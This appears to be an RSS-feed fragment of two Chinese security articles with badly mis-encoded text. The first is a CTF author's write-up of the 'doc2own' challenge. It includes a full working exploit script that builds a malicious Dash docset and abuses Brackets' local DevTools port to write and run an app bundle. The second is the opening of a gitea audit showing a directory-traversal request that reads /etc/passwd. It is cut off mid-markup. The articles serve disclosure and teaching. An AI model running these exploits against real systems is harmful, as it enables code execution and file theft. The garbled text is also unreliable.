ä¸‹çš„è¡¨ç°æ˜¯ï¼Œå¦‚æœæ–‡ä»¶å¤¹æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ .app bundleï¼Œé‚£ä¹ˆç­‰åŒäºåŒå‡» .appï¼Œä¹Ÿå°±æ˜¯è¿è¡Œã€‚å¦‚æœä½ ä¸å¤ªæ˜ç™½ï¼Œé‚£ä¹ˆè¯·å°è¯•åœ¨ç»ˆç«¯ä¸­æ‰§è¡Œ&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;find /Applications/Calculator.app
open /Applications/Calculator.app&lt;/code&gt;&lt;p&gt;å› æ­¤æˆ‘ä»¬å…ˆåˆ¤æ–­å¹³å°å·®å¼‚ï¼Œé€šè¿‡ appshell.fs åˆ›å»ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶åè°ƒç”¨å¯¹åº”çš„æ–¹æ³•å³å¯è¿è¡Œï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;function calc() {  // use brackets.fs to write your own executable  // makedir, writeFile, chmod are your friends  if (brackets.app.getUserDocumentsDirectory().indexOf(&#39;/&#39;) === 0) {    brackets.app.showOSFolder(&#39;/Applications/Calculator.app&#39;);  } else {    brackets.app.openURLInDefaultBrowser(&#39;file:///C:/windows/system32/calc.exe&#39;);  }}&lt;/code&gt;&lt;p&gt;åˆ°è¿™é‡Œå³å¯å®ç°ä¸ VSCode ä¹‹å‰çš„ bug å®Œå…¨ä¸€è‡´çš„æ•ˆæœï¼Œé€šè¿‡ dns é‡ç»‘å®šæ”»å‡»æœ¬åœ°ç«¯å£å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚åœ¨æˆ‘ä¹‹å‰çš„æ¼æ´æŠ¥å‘Šåï¼ŒlibCEF å‚è€ƒ node.js å’Œ Electron çš„åšæ³•ä¿®å¤äº† dns é‡ç»‘å®šçš„é—®é¢˜ã€‚ä½†æ˜¯æœ€æ–°ç‰ˆ Brackets çš„è¿™ä¸ªç«¯å£ä»ç„¶å¯ä»¥ä» localhost è®¿é—®ã€‚&lt;/p&gt;&lt;hr&gt;&lt;p&gt;ä¸ºä»€ä¹ˆç›¯ä¸Šäº† Dash å‘¢ï¼Ÿ&lt;/p&gt;&lt;p&gt;Dash å¯ä»¥è¯´æ˜¯ä»¥ macOS ä¸ºä¸»åŠ›å¼€å‘ç¯å¢ƒçš„ç¨‹åºå‘˜å½“ä¸­å¾ˆå—æ¬¢è¿çš„ä¸€æ¬¾å·¥å…·äº†ï¼Œä¸»è¦åŠŸèƒ½å°±æ˜¯ç¦»çº¿çœ‹æ–‡æ¡£ã€‚æ–‡æ¡£æ˜¯ä¸€ä¸ªåç¼€ä¸º docset çš„ bundle æ–‡ä»¶å¤¹ï¼Œå­˜æ”¾ html èµ„æºå’Œç´¢å¼•æ•°æ®åº“ç­‰ã€‚&lt;/p&gt;&lt;p&gt;å®ƒå…·æœ‰ä¸¤ä¸ªæ”»å‡»é¢ï¼Œä¸€ä¸ªæ˜¯å±•ç¤ºæ–‡æ¡£æ—¶ç”¨çš„æ˜¯ WebViewï¼Œå¦ä¸€ä¸ªæ˜¯åœ¨æ‰“å¼€æ–‡æ¡£çš„æ—¶å€™ä¼šå¯ç”¨ä¸€ä¸ªå†…ç½®çš„ GCDWebServer æ¥å¯åŠ¨ä¸€ä¸ª http æœåŠ¡ï¼Œå¯é€šè¿‡å…¶ä»–è®¡ç®—æœºè®¿é—®ã€‚&lt;/p&gt;&lt;p&gt;macOS ä¸Šçš„ &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//developer.apple.com/documentation/webkit/webview%3Flanguage%3Dobjc&quot;&gt;WebView&lt;/a&gt; å’Œ iOS çš„ UIWebView åœ¨å¾ˆå¤šæ–¹é¢æ˜¯ä¸€æ ·çš„ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;æ²¡æœ‰è¿›ç¨‹éš”ç¦»å’Œ sandbox&lt;/li&gt;&lt;li&gt;åœ¨ file:/// åŸŸä¸‹çš„æ–‡ä»¶é»˜è®¤å…·æœ‰ AllowUniversalAccessFromFileURLs å’Œ AllowFileAccessFromFileURLs çš„ UXSS èƒ½åŠ›&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;åœ¨ä¹‹å‰ç‰ˆæœ¬çš„ Dash å°±å¯ä»¥é€šè¿‡ä¸€ä¸ªæ¶æ„çš„ docsetï¼Œä»¥ XMLHttpRequest çš„æ–¹å¼è¯»å–å¹¶ä¸Šä¼ æœ¬åœ°æ–‡ä»¶ï¼ˆä¾‹å¦‚ ssh å…¬ç§é’¥ï¼‰çš„å†…å®¹ã€‚åœ¨ 3.x çš„æŸä¸€ä¸ªç‰ˆæœ¬ï¼ˆå…·ä½“ä¸è¯¦ï¼‰ä¸­å¢åŠ äº†é™åˆ¶ï¼Œå¦‚æœè®¿é—®çš„æ–‡ä»¶åœ¨ docset ç›®å½•ä¹‹å¤–ä¼šå¤±è´¥ã€‚ä½†è¿™ä¸ªç‰ˆæœ¬å¯ä»¥ä½¿ç”¨åœ¨å‹ç¼©åŒ…ä¸­æ·»åŠ ç¬¦å·é“¾æ¥çš„æ–¹å¼ç»•è¿‡ï¼ˆç”±äº docset æ˜¯æ–‡ä»¶å¤¹ï¼Œé€šå¸¸çš„åˆ†å‘æ–¹å¼æ˜¯ä½¿ç”¨ tar.gz åŒ…ï¼‰ã€‚æ­¤å¤–ç¬¦å·é“¾æ¥çš„é—®é¢˜åŒæ ·å½±å“ Dash å†…ç½®çš„ http æœåŠ¡ã€‚&lt;/p&gt;&lt;p&gt;ç»è¿‡æŠ¥å‘Šåä¿®å¤äº†æœ¬åœ°æ–‡ä»¶æ³„éœ²çš„é—®é¢˜ï¼Œè¿™ä¹Ÿä¸ºå‡ºé¢˜æä¾›äº†ä¸€ä¸ªç»ä½³çš„æ¡ä»¶â€”â€”è¿™æ˜¯ä¸ªå…è®¸è·¨åŸŸè¯·æ±‚ï¼Œå´åˆä¸èƒ½ç®€å• AJAX è¯»æœ¬åœ°æ–‡ä»¶çš„ç¯å¢ƒï¼Œé€‰æ‰‹å¿…é¡»å®ç°å®è´¨æ€§çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æœ€åè¿™ä¸ª WebView å’Œç³»ç»Ÿå†…ç½® Safari çš„ WebKit æ˜¯ä¸€è‡´çš„ï¼Œé¿å…é€‰æ‰‹ä½¿ç”¨å·²å…¬å¼€çš„æµè§ˆå™¨æ¼æ´åˆ©ç”¨ä»£ç æ¥è·å¾—æƒé™ã€‚è‡³äºæ‰“ ctf ç”¨ Safari 0dayï¼Ÿç–¯äº†å—ã€‚&lt;/p&gt;&lt;hr&gt;&lt;blockquote&gt;&lt;b&gt;doc2own&lt;/b&gt; ( Points: 425, Solved by 4 Teams )&lt;br&gt;I have to fix these issues during the flight. Since that airline does not provide Internet, I have to download some documents for offline use.&lt;br&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//34.236.229.208%3A8080&quot;&gt;http://34.236.229.208:8080&lt;/a&gt;&lt;br&gt;Hint : Itâ€™s a pwnable game. You really need to achieve RCE to get the flag.&lt;/blockquote&gt;&lt;p&gt;é¢˜ç›®è®¾å®šçš„å‰§æƒ…å°±æ˜¯ä¸€ä¸ªåƒæˆ‘ä¸€æ ·çš„ä¿¡æ¯æŠ€æœ¯åº•å±‚åŠ³åŠ¨åŠ›ï¼Œåœ¨å‡ºå·®çš„è·¯ä¸Šéœ€è¦ä¿® bugï¼Œåˆæ²¡ç½‘ï¼Œåªèƒ½ä¸‹ä¸€ä¸ªç¦»çº¿æ–‡æ¡£å¤‡ç”¨ã€‚è€Œè¿™æ—¶å€™ä¸‹åˆ°äº†ä¸å¹²å‡€çš„æ–‡æ¡£ï¼Œäºæ˜¯ç”µè„‘ä¸­æ‹›äº†ã€‚&lt;/p&gt;&lt;p&gt;217 æˆ˜é˜ŸæŒ‰ç…§é¢„æœŸçš„è§£æ³•åšäº†å‡ºæ¥ã€‚&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//blog.l4ys.tw/2018/07/realworld-ctf-2018-doc2own/&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot;&gt;https://blog.l4ys.tw/2018/07/realworld-ctf-2018-doc2own/&lt;/a&gt;&lt;p&gt;åœ¨è¿™é‡Œé™„ä¸Šæˆ‘è‡ªå·±è°ƒè¯•é€šè¿‡çš„ä¸€ä¸ªè§£æ³•ï¼Œç”Ÿæˆä¸€ä¸ª docsetï¼Œåœ¨ Brackets è¿è¡Œçš„æƒ…å†µä¸‹æ‰“å¼€ä¼šå¼¹å‡ºä¸€ä¸ªè®¡ç®—å™¨&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;contents=exploit.docset/Contentsdocs=$contents/Resources/Documents

rm -r $contentsmkdir -p $docs
cat &amp;gt; $docs/index.html &amp;lt;&amp;lt;- &quot;EOF&quot;&amp;lt;script&amp;gt;
async function main() {  const list = await fetch(&#39;http://localhost:9234/json&#39;).then(r =&amp;gt; r.json());  const item =  list.find(item =&amp;gt; item.url.indexOf(&#39;file:///&#39;) === 0);  if (!item) return console.error(&#39;invalid response&#39;);  const url = `ws://127.0.0.1:9234/devtools/page/${item.id}`;  console.log(&#39;url:&#39; + url);  exploit(url);}function exploit(url) {  function calc() {    const fs = window.appshell.fs;    const mkdir = path =&amp;gt; new Promise((resolve, reject) =&amp;gt;
      fs.makedir(path, 0755, err =&amp;gt; err =&amp;gt; err === 0 ? resolve(true) : reject(err)));    const writeFile = (path, content) =&amp;gt; new Promise((resolve, reject) =&amp;gt;
      fs.writeFile(path, content, &#39;utf8&#39;, false, err =&amp;gt; err === 0 ? resolve(true) : reject(err)));    const chmod = (path, mode) =&amp;gt; new Promise((resolve, reject) =&amp;gt;
      fs.chmod(path, mode, err =&amp;gt; err === 0 ? resolve(true) : reject(err)));    const INFO_PLIST = `&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
      &amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
      &amp;lt;plist version=&quot;1.0&quot;&amp;gt;
      &amp;lt;dict&amp;gt;
        &amp;lt;key&amp;gt;CFBundleExecutable&amp;lt;/key&amp;gt;
        &amp;lt;string&amp;gt;hello&amp;lt;/string&amp;gt;
        &amp;lt;key&amp;gt;CFBundleIconFile&amp;lt;/key&amp;gt;
        &amp;lt;string&amp;gt;AppIcon&amp;lt;/string&amp;gt;
      &amp;lt;/dict&amp;gt;
      &amp;lt;/plist&amp;gt;`;    const EXEC = `#!/bin/sh      open -a Calculator`;    const app = &#39;/tmp/test.app/&#39;;    const base = app + &#39;Contents/&#39;    return mkdir(base + &#39;MacOS&#39;)      .then(writeFile(base + &#39;Info.plist&#39;, INFO_PLIST))      .then(writeFile(base + &#39;MacOS/hello&#39;, EXEC))      .then(chmod(base + &#39;MacOS/hello&#39;, 0777))      .then(new Promise((resolve, reject) =&amp;gt; {        brackets.app.showOSFolder(app)      }));  }  const ws = new WebSocket(url);  ws.onopen = async () =&amp;gt; {    let counter = 13371337;    const send = (method, params) =&amp;gt; new Promise((resolve, reject) =&amp;gt; {      const id = counter++;      const recv = ({ data }) =&amp;gt; {        const parsed = JSON.parse(data);        if (parsed.id === id) {          resolve(parsed.result);          ws.removeEventListener(&#39;message&#39;, recv);        } else {          console.log(&#39;message: &#39;, data);        }      };      ws.addEventListener(&#39;message&#39;, recv);      ws.send(JSON.stringify({ id, method, params }));    });    const response = await send(&#39;Runtime.evaluate&#39;, { expression: `(${calc})()` });    console.log(response.result);    ws.close();  }  ws.onerror = () =&amp;gt; console.log(&#39;failed to connect&#39;);}main();&amp;lt;/script&amp;gt;
EOF

cat &amp;gt; $contents/Info.plist &amp;lt;&amp;lt;- &quot;EOF&quot;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
&amp;lt;plist version=&quot;1.0&quot;&amp;gt;
&amp;lt;dict&amp;gt;
  &amp;lt;key&amp;gt;CFBundleIdentifier&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;exploit&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;CFBundleName&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;Exploit&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;DocSetPlatformFamily&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;exploit&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;dashIndexFilePath&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;index.html&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;isDashDocset&amp;lt;/key&amp;gt;
  &amp;lt;true/&amp;gt;
&amp;lt;/dict&amp;gt;
&amp;lt;/plist&amp;gt;
EOF

sqlite3 -batch $contents/Resources/docSet.dsidx &amp;lt;&amp;lt; &quot;EOF&quot;CREATE TABLE searchIndex(id INTEGER PRIMARY KEY, name TEXT, type TEXT, path TEXT);CREATE UNIQUE INDEX anchor ON searchIndex (name, type, path);INSERT OR IGNORE INTO searchIndex(name, type, path) VALUES (&#39;Exploit&#39;, &#39;Class&#39;, &#39;index.html&#39;);EOF

open exploit.docset

tar czf exp.tar.gz exploit.docset&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9aed9f3c57895c564fc6c61b0437830f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;725&quot; data-rawheight=&quot;364&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9aed9f3c57895c564fc6c61b0437830f&quot; data-watermark-src=&quot;v2-ce59018ec0a4bbcde7976e3433c41c84&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;hr&gt;&lt;p&gt;ä½†æ˜¯å‡ºä¹æˆ‘æ„æ–™çš„æ˜¯ï¼Œå¦å¤–ä¸‰æ”¯å¼ºé˜Ÿ PPP, CyKOR å’Œ ESPR åœ¨çŸ­çŸ­çš„æ¯”èµ›æœŸé—´å†…ç›´æ¥äº¤ä¸Šäº†ä¸¤ä¸ªä¸åŒçš„ 0day è§£æ³•ã€‚èµ›åæˆ‘å‘å‚å•†æ•´ç†æ¼æ´æŠ¥å‘Šï¼Œåˆå¿«é€Ÿæµè§ˆäº†ä¸€éåæ±‡ç¼–ï¼Œåˆå‘ç°äº†å¦å¤–çš„ä¸€äº›ç–‘ä¼¼è¿œç¨‹ä»£ç æ‰§è¡Œé—®é¢˜ï¼ˆæˆ‘æ²¡æœ‰åš pocï¼Œç»è¿‡å¼€å‘è€…è‡ªå·±ç¡®è®¤å­˜åœ¨ï¼‰ã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;Dash ä½œè€…æ¥åˆ°æŠ¥å‘Šä¹‹åéå¸¸è¿…é€Ÿåœ°æ¨å‡ºäº†ä¿®å¤è¡¥ä¸ï¼Œæ£€æŸ¥äº†çº¿ä¸Šçš„ Dash æ–‡æ¡£ä»“åº“ç¡®ä¿ä¹‹å‰æ²¡æœ‰å®è´¨æ€§çš„æ”»å‡»ï¼Œåœ¨æ›´æ–°æ—¥å¿—ä¸­æ˜ç¡®å†™æ˜äº†å®‰å…¨æ¼æ´çš„å­˜åœ¨å¹¶å¯¹ä»¥ä¸Šæˆ˜é˜Ÿè¡¨ç¤ºäº†è‡´è°¢ã€‚åº”æ€¥å“åº”åšå¾—éå¸¸ä¸é”™ã€‚&lt;/b&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c1224d9312c077421d4def640a5263d5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1244&quot; data-rawheight=&quot;1188&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c1224d9312c077421d4def640a5263d5&quot; data-watermark-src=&quot;v2-8696ee455e323a6046252f1330f416cb&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;Dash ç”¨æˆ·è¯·å°½å¿«å‡çº§åˆ° 4.4.0 æ¥ä¿®å¤è¿™äº›é—®é¢˜ã€‚&lt;/p&gt;</description>
<author>å°è˜‘è‡</author>
<guid isPermaLink="false">2018-08-08-41544965</guid>
<pubDate>Wed, 08 Aug 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Goä»£ç å®¡è®¡ - gitea è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´é“¾</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-07-16-39835913.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/39835913&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-111a2318c077e5d343649b60742fa217_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;ä½œè€…ï¼š &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@å‘¨ä½©é›¨&lt;/a&gt;&lt;/p&gt;&lt;p&gt;[ Phith0nï¼Œç°å°±èŒäºé•¿äº­ç§‘æŠ€ï¼Œé•¿æœŸå…³æ³¨å¹¶ç¬”è€•äºå®‰å…¨ç¼–ç ã€ä»£ç å®¡è®¡ç­‰æ–¹å‘]&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;è¿™æ˜¯ä¸€ä¸ªéå¸¸æ¼‚äº®çš„æ¼æ´é“¾ï¼Œå¾ˆä¹…æ²¡è§è¿‡äº†ã€‚&lt;br&gt;æˆ‘ç”¨dockeræ¥å¤ç°å¹¶å­¦ä¹ è¿™ä¸ªæ¼æ´ï¼Œå®˜æ–¹æä¾›äº†dockeré•œåƒï¼Œvulhubä¹Ÿä¼šä¸Šçº¿è¿™ä¸ªç¯å¢ƒã€‚&lt;/p&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_1&quot;&gt;æ¼æ´ä¸€ã€ é€»è¾‘é”™è¯¯å¯¼è‡´æƒé™ç»•è¿‡&lt;/a&gt;&lt;/h2&gt;&lt;blockquote&gt;è¿™æ˜¯æœ¬æ¼æ´é“¾çš„å¯¼ç«ç´¢ï¼Œå…¶å‡ºç°åœ¨Git LFSçš„å¤„ç†é€»è¾‘ä¸­ã€‚&lt;br&gt;Git LFSæ˜¯Gitä¸ºå¤§æ–‡ä»¶è®¾ç½®çš„å­˜å‚¨å®¹å™¨ï¼Œæˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºï¼Œä»–å°†çœŸæ­£çš„æ–‡ä»¶å­˜å‚¨åœ¨gitä»“åº“å¤–ï¼Œè€Œgitä»“åº“ä¸­åªå­˜å‚¨äº†è¿™ä¸ªæ–‡ä»¶çš„ç´¢å¼•ï¼ˆä¸€ä¸ªå“ˆå¸Œå€¼ï¼‰ã€‚è¿™æ ·ï¼Œgit objectså’Œ.gitæ–‡ä»¶å¤¹ä¸‹å…¶å®æ˜¯æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶çš„ï¼Œè¿™ä¸ªæ–‡ä»¶å‚¨å­˜åœ¨gitæœåŠ¡å™¨ä¸Šã€‚giteaä½œä¸ºä¸€ä¸ªgitæœåŠ¡å™¨ï¼Œä¹Ÿæä¾›äº†LFSåŠŸèƒ½ã€‚&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;åœ¨ modules/lfs/server.go æ–‡ä»¶ä¸­ï¼ŒPostHandleræ˜¯POSTè¯·æ±‚çš„å¤„ç†å‡½æ•°ï¼š&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d929f2e40baaf6f1cfe1bfd334683da8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;564&quot; data-rawheight=&quot;500&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-d929f2e40baaf6f1cfe1bfd334683da8&quot; data-watermark-src=&quot;v2-30163bf9e945a1bb9751aa52c6556186&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;å¯è§ï¼Œå…¶ä¸­é—´éƒ¨åˆ†åŒ…å«å¯¹æƒé™çš„æ£€æŸ¥ï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
if !authenticate(ctx, repository, rv.Authorization, true) {
    requireAuth(ctx)
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;åœ¨æ²¡æœ‰æƒé™çš„æƒ…å†µä¸‹ï¼Œä»…æ‰§è¡Œäº†requireAuthå‡½æ•°ï¼šè¿™ä¸ªå‡½æ•°åšäº†ä¸¤ä»¶äº‹ï¼Œä¸€æ˜¯å†™å…¥WWW-Authenticateå¤´ï¼ŒäºŒæ˜¯è®¾ç½®çŠ¶æ€ç ä¸º401ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æ²¡æœ‰æƒé™çš„æƒ…å†µä¸‹ï¼Œå¹¶æ²¡æœ‰åœæ­¢æ‰§è¡ŒPostHandlerå‡½æ•°ã€‚&lt;br&gt;æ‰€ä»¥ï¼Œè¿™é‡Œå­˜åœ¨ä¸€å¤„æƒé™ç»•è¿‡æ¼æ´ã€‚&lt;/p&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_2&quot;&gt;æ¼æ´äºŒã€ç›®å½•ç©¿è¶Šæ¼æ´&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;è¿™ä¸ªæƒé™ç»•è¿‡æ¼æ´å¯¼è‡´çš„åæœæ˜¯ï¼Œæœªæˆæƒçš„ä»»æ„ç”¨æˆ·éƒ½å¯ä»¥ä¸ºæŸä¸ªé¡¹ç›®ï¼ˆåé¢éƒ½ä»¥vulhub/repoä¸ºä¾‹ï¼‰åˆ›å»ºä¸€ä¸ªGit LFSå¯¹è±¡ã€‚&lt;/p&gt;&lt;p&gt;è¿™ä¸ªLFSå¯¹è±¡å¯ä»¥é€šè¿‡http://example.com/vulhub/repo.git/info/lfs/objects/[oid]è¿™æ ·çš„æ¥å£æ¥è®¿é—®ï¼Œæ¯”å¦‚ä¸‹è½½ã€å†™å…¥å†…å®¹ç­‰ã€‚å…¶ä¸­[oid]æ˜¯LFSå¯¹è±¡çš„IDï¼Œé€šå¸¸æ¥è¯´æ˜¯ä¸€ä¸ªå“ˆå¸Œï¼Œä½†giteaä¸­å¹¶æ²¡æœ‰é™åˆ¶è¿™ä¸ªIDå…è®¸åŒ…å«çš„å­—ç¬¦ï¼Œè¿™ä¹Ÿæ˜¯å¯¼è‡´ç¬¬äºŒä¸ªæ¼æ´çš„æ ¹æœ¬åŸå› ã€‚&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬åˆ©ç”¨ç¬¬ä¸€ä¸ªæ¼æ´ï¼Œå…ˆå‘é€ä¸€ä¸ªæ•°æ®åŒ…ï¼Œåˆ›å»ºä¸€ä¸ªOidä¸º....../../../etc/passwdçš„LFSå¯¹è±¡ï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;POST /vulhub/repo.git/info/lfs/objects HTTP/1.1
Host: your-ip:3000Accept-Encoding: gzip, deflate
Accept: application/vnd.git-lfs+json
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; 
Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 151

{ 
    &quot;Oid&quot;: &quot;....../../../etc/passwd&quot;, 
    &quot;Size&quot;: 1000000, 
    &quot;User&quot; : &quot;a&quot;, 
    &quot;Password&quot; : &quot;a&quot;, 
    &quot;Repo&quot; : &quot;a&quot;, 
    &quot;Authorization&quot; : &quot;a&quot;
}&lt;/code&gt;&lt;p&gt;å…¶ä¸­ï¼Œvulhub/repoæ˜¯ä¸€ä¸ªå…¬å¼€çš„é¡¹ç›®ã€‚&lt;/p&gt;&lt;blockquote&gt;ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ¡ä»¶çš„ï¼Œç¬¬ä¸€ä¸ªæ¡ä»¶å°±æ˜¯éœ€è¦æœ‰ä¸€ä¸ªå…¬å¼€é¡¹ç›®ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿè™½ç„¶â€œåˆ›å»ºLFSå¯¹è±¡â€æ¥å£æœ‰æƒé™ç»•è¿‡æ¼æ´ï¼Œä½†æ˜¯â€œè¯»å–è¿™ä¸ªå¯¹è±¡æ‰€ä»£è¡¨çš„æ–‡ä»¶â€æ¥å£æ²¡æœ‰æ¼æ´ï¼Œä¼šå…ˆæ£€æŸ¥ä½ æ˜¯å¦æœ‰æƒé™è®¿é—®è¿™ä¸ªLFSå¯¹è±¡æ‰€åœ¨çš„é¡¹ç›®ã€‚åªæœ‰å…¬å¼€é¡¹ç›®æ‰æœ‰æƒé™è¯»å–ã€‚&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;è§ä¸‹å›¾ï¼Œå‘é€æ•°æ®åŒ…åï¼Œè™½ç„¶è¿”å›äº†401çŠ¶æ€ç ï¼Œä½†å®é™…ä¸Šè¿™ä¸ªLFSå¯¹è±¡å·²ç»åˆ›å»ºæˆåŠŸï¼Œä¸”å…¶Oidä¸º....../../../etc/passwdã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6e9540049efacee155988a5491e99364_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;150&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6e9540049efacee155988a5491e99364&quot; data-watermark-src=&quot;v2-565bff4dd5b1e6d812fa0a1f56416882&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;ç¬¬äºŒæ­¥ï¼Œå°±æ˜¯è®¿é—®è¿™ä¸ªå¯¹è±¡ã€‚è®¿é—®æ–¹æ³•å°±æ˜¯GETè¯·æ±‚http://example.com/vulhub/repo.git/info/lfs/objects/[oid]/sthï¼Œoidå°±æ˜¯åˆšæ‰æŒ‡å®šçš„ï¼Œè¿™é‡Œè¦ç”¨urlç¼–ç ä¸€ä¸‹ã€‚&lt;/p&gt;&lt;p&gt;è§ä¸‹å›¾ï¼Œ/etc/passwdå·²è¢«æˆåŠŸè¯»å–ï¼š&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-67ea3af4a552aa4f3206b88d1f1225ee_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;291&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-67ea3af4a552aa4f3206b88d1f1225ee&quot; data-watermark-src=&quot;v2-90dc0125fbfb188264dc7b126b1caf69&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;é‚£ä¹ˆï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ä¸ºä»€ä¹ˆè¯»å–åˆ°äº†/etc/passwdæ–‡ä»¶ã€‚&lt;/p&gt;&lt;p&gt;ä»£ç  modules/lfs/content_store.go ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d8ad85235bfa87345192ce67c32dad27_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;368&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-d8ad85235bfa87345192ce67c32dad27&quot; data-watermark-src=&quot;v2-12d9755017f8fa97cd644ba53e169c65&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;å¯è§ï¼Œmeta.Oidè¢«ä¼ å…¥transformKeyå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°é‡Œï¼Œå°†Oidè½¬æ¢æˆäº†key[0:2]/key[2:4]/key[4:]è¿™æ ·çš„å½¢å¼ï¼Œå‰ä¸¤ä¸ªã€ä¸­é—´ä¸¤ä¸ªå­—ç¬¦åšä¸ºç›®å½•åï¼Œç¬¬å››ä¸ªå­—ç¬¦ä»¥åçš„å†…å®¹ä½œä¸ºæ–‡ä»¶åã€‚&lt;/p&gt;&lt;p&gt;é‚£ä¹ˆï¼Œæˆ‘åˆ›å»ºçš„Oidä¸º....../../../etc/passwdï¼Œåœ¨ç»è¿‡transformKeyå‡½æ•°åå°±å˜æˆäº†../../../../../etc/passwdï¼Œs.BasePathæ˜¯LFSå¯¹è±¡çš„åŸºç¡€ç›®å½•ï¼ŒäºŒè€…æ‹¼æ¥åè‡ªç„¶å°±è¯»å–åˆ°äº†/etc/passwdæ–‡ä»¶ã€‚&lt;/p&gt;&lt;p&gt;è¿™å°±æ˜¯ç¬¬äºŒä¸ªæ¼æ´ï¼šç›®å½•ç©¿è¶Šã€‚&lt;/p&gt;&lt;h2&gt;&lt;br&gt;&lt;a 